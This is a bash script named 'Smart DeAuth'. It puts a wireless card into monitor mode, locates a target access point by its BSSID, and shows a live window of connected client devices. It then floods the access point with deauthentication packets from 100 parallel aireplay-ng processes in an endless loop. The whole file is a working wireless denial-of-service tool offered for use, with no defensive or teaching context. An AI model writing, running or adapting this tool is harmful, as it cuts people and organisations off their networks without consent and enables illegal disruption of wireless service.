#!/bin/bash

# Colors
GREEN="\033[32m"
RED="\033[31m"
BLUE="\033[34m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"
BOLD="\033[1m"

# Function to clean up and exit
function cleanup() {
    echo -e "\n${RED}[*] Cleaning up...${RESET}"
    sudo airmon-ng stop wlan0mon >/dev/null 2>&1
    sudo systemctl restart NetworkManager
}

# Trap Ctrl+C
trap cleanup EXIT

# Function to display title
function display_title() {
    clear
    echo -e "${GREEN}"
    figlet -f slant "Smart DeAuth" | lolcat -a -d 1
    echo -e "${RESET}"
}

# Function to initialize monitor mode
function init_monitor_mode() {
    echo -e "\n${CYAN}[*] Initializing monitor mode...${RESET}"
    sudo airmon-ng check kill >/dev/null 2>&1
    sudo airmon-ng start wlan0 >/dev/null 2>&1
}

# Function to scan networks
function scan_networks() {
    local target_bssid=$1
    echo -e "\n${CYAN}[*] Scanning for networks...${RESET}"
    
    # Start airodump-ng to collect data
    sudo airodump-ng --output-format csv --write /tmp/scan wlan0mon >/dev/null 2>&1 &
    DUMP_PID=$!
    
    # Give it time to collect data
    sleep 5
    
    # Kill airodump-ng
    sudo kill $DUMP_PID 2>/dev/null
    wait $DUMP_PID 2>/dev/null
    
    # Check if target exists and get channel
    if [ -f "/tmp/scan-01.csv" ]; then
        protected_channel=$(grep "$target_bssid" /tmp/scan-01.csv | cut -d ',' -f 4 | tr -d ' ')
        if [ ! -z "$protected_channel" ]; then
            echo -e "${GREEN}[+] Target found on channel $protected_channel${RESET}"
            return 0
        fi
    fi
    
    echo -e "${RED}[!] Target not found${RESET}"
    return 1
}

# Function to show attack info in main window
function show_attack_info() {
    local bssid=$1
    local channel=$2
    local packets=$3
    local rate=$4
    
    clear
    echo -e "${GREEN}"
    figlet -f slant "DeAuth Attack" | lolcat -a -d 1
    echo -e "${RESET}"
    
    echo -e "${GREEN}╔═══════════════════════ ATTACK STATUS ══════════════════════╗${RESET}"
    echo -e "${GREEN}║                                                            ║${RESET}"
    printf "${GREEN}║${RESET} %-15s ${CYAN}%-42s${GREEN}║${RESET}\n" "Target BSSID:" "$bssid"
    printf "${GREEN}║${RESET} %-15s ${CYAN}%-42s${GREEN}║${RESET}\n" "Channel:" "$channel"
    printf "${GREEN}║${RESET} %-15s ${RED}%-42s${GREEN}║${RESET}\n" "Packets Sent:" "$packets"
    printf "${GREEN}║${RESET} %-15s ${RED}%-42s${GREEN}║${RESET}\n" "Rate:" "$rate pkts/sec"
    echo -e "${GREEN}║                                                            ║${RESET}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${RESET}"
}

# Function to start monitor in new terminal
function start_monitor() {
    local bssid=$1
    local temp_file="/tmp/client_scan.csv"
    
    # Create monitor script
    cat > /tmp/monitor.sh << 'EOL'
#!/bin/bash

# Colors
GREEN="\033[32m"
RED="\033[31m"
BLUE="\033[34m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"
BOLD="\033[1m"

function display_header() {
    clear
    echo -e "${BLUE}${BOLD}"
    toilet -f slant --gay "Target Info"
    echo -e "${RESET}"
}

function scan_target() {
    local bssid=$1
    local temp_file="/tmp/scan"
    
    # Kill any existing airodump-ng processes
    sudo killall airodump-ng 2>/dev/null
    
    # Start airodump-ng focused on target
    sudo airodump-ng --bssid "$bssid" --channel "$channel" --write "$temp_file" --output-format csv wlan0mon >/dev/null 2>&1 &
    DUMP_PID=$!
    
    # Give it time to collect data
    sleep 3
    
    # Kill airodump-ng
    sudo kill $DUMP_PID 2>/dev/null
    wait $DUMP_PID 2>/dev/null
    
    if [ -f "${temp_file}-01.csv" ]; then
        network_info=$(tail -n +2 "${temp_file}-01.csv" | grep "$bssid")
        if [ ! -z "$network_info" ]; then
            ssid=$(echo "$network_info" | cut -d ',' -f 14 | tr -d ' ')
            channel=$(echo "$network_info" | cut -d ',' -f 4 | tr -d ' ')
            power=$(echo "$network_info" | cut -d ',' -f 8 | tr -d ' ')
            encryption=$(echo "$network_info" | cut -d ',' -f 6 | tr -d ' ')
            cipher=$(echo "$network_info" | cut -d ',' -f 7 | tr -d ' ')
            auth=$(echo "$network_info" | cut -d ',' -f 8 | tr -d ' ')
            frequency=$(echo "$network_info" | cut -d ',' -f 3 | tr -d ' ')
            
            clients=$(tail -n +5 "${temp_file}-01.csv" | grep "$bssid")
            client_count=$(echo "$clients" | grep -v "^$" | wc -l)
            
            display_header
            
            echo -e "\n${GREEN}╔═══════════════════════ TARGET NETWORK INFO ══════════════════════╗${RESET}"
            echo -e "${GREEN}║                                                                   ║${RESET}"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "Network:" "$ssid"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "BSSID:" "$bssid"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "Channel:" "$channel"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "Frequency:" "${frequency}MHz"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "Signal:" "${power}dBm"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "Security:" "$encryption"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "Cipher:" "$cipher"
            printf "${GREEN}║${RESET} %-15s ${CYAN}%-47s${GREEN}║${RESET}\n" "Auth:" "$auth"
            printf "${GREEN}║${RESET} %-15s ${RED}%-47s${GREEN}║${RESET}\n" "Clients:" "$client_count connected"
            echo -e "${GREEN}║                                                                   ║${RESET}"
            echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════╝${RESET}"
            
            if [ $client_count -gt 0 ]; then
                echo -e "\n${RED}[+] Connected Devices:${RESET}"
                echo -e "${GREEN}╔═════════════════════════ CLIENTS ════════════════════════╗${RESET}"
                echo -e "${YELLOW}║ MAC Address       Signal  Packets    Device Name         ║${RESET}"
                echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${RESET}"
                
                echo "$clients" | while read line; do
                    client_mac=$(echo "$line" | cut -d ',' -f 1 | tr -d ' ')
                    client_power=$(echo "$line" | cut -d ',' -f 4 | tr -d ' ')
                    client_packets=$(echo "$line" | cut -d ',' -f 6 | tr -d ' ')
                    client_vendor=$(macchanger -l | grep -i "${client_mac:0:8}" | cut -d ' ' -f 5- || echo "Unknown")
                    
                    printf "${GREEN}║${CYAN} %-15s  %4sdBm  %7s   %-16s ${GREEN}║${RESET}\n" \
                        "$client_mac" "$client_power" "$client_packets" "$client_vendor"
                done
                echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${RESET}"
            fi
            
            if [ -f "/tmp/deauth_status/attack_status.json" ]; then
                status=$(cat "/tmp/deauth_status/attack_status.json")
                packets=$(echo "$status" | grep -o '"packets": "[^"]*' | cut -d '"' -f 4)
                rate=$(echo "$status" | grep -o '"rate": "[^"]*' | cut -d '"' -f 4)
                
                echo -e "\n${RED}[+] Attack Status:${RESET}"
                echo -e "${GREEN}╔════════════════════════ ATTACK STATS ═══════════════════════╗${RESET}"
                printf "${GREEN}║${RESET} %-15s ${RED}%-45s${GREEN}║${RESET}\n" "Total Packets:" "$packets"
                printf "${GREEN}║${RESET} %-15s ${RED}%-45s${GREEN}║${RESET}\n" "Current Rate:" "$rate pkts/sec"
                echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${RESET}"
            fi
        fi
    fi
    
    rm -f ${temp_file}* 2>/dev/null
}

channel=$(sudo iwlist wlan0mon channel | grep "Current Frequency" | grep -o "Channel [0-9]*" | cut -d' ' -f2)

while true; do
    scan_target "$1"
    sleep 1
done
EOL

    chmod +x /tmp/monitor.sh
    xterm -bg black -fg green -T "Live Target Monitor" -geometry 100x45+0+0 -e "/tmp/monitor.sh $bssid" &
}

# Function to perform deauth attack
function deauth_attack() {
    local bssid=$1
    local channel=$2
    local status_dir="/tmp/deauth_status"
    local packets_sent=0
    local start_time=$SECONDS
    local rate=0
    
    mkdir -p "$status_dir"
    
    # Set channel
    iwconfig wlan0mon channel "$channel"
    
    while true; do
        # Launch massive parallel deauth
        for i in {1..100}; do
            # Each process sends 500 packets
            aireplay-ng --deauth 500 -a "$bssid" --ignore-negative-one wlan0mon >/dev/null 2>&1 &
        done
        
        # Update stats
        packets_sent=$((packets_sent + 50000))
        elapsed=$((SECONDS - start_time))
        if [ $elapsed -gt 0 ]; then
            rate=$((packets_sent / elapsed))
        fi
        
        # Update status file for monitor window
        echo "{\"packets\": \"$packets_sent\", \"rate\": \"$rate\"}" > "$status_dir/attack_status.json"
        
        # Show info in main window
        show_attack_info "$bssid" "$channel" "$packets_sent" "$rate"
        
        # Very small delay to prevent system overload
        sleep 0.1
    done
}

# Main execution
display_title

echo -e "\n${GREEN}[*] ${BOLD}Network Configuration${RESET}"
read -p "$(echo -e "${GREEN}[?]${RESET} Enter target BSSID (e.g., AA:BB:CC:DD:EE:FF): ")" target_bssid

# Validate BSSID format
if ! echo "$target_bssid" | grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$' >/dev/null; then
    echo -e "${RED}[!] Invalid BSSID format. Please use format like AA:BB:CC:DD:EE:FF${RESET}"
    exit 1
fi

init_monitor_mode

if scan_networks "$target_bssid"; then
    echo -e "\n${GREEN}[*] Starting maximum speed deauth attack...${RESET}"
    
    # Start monitor in new window
    start_monitor "$target_bssid"
    
    # Start the attack with massive packet rate
    deauth_attack "$target_bssid" "$protected_channel"
else
    cleanup
fi
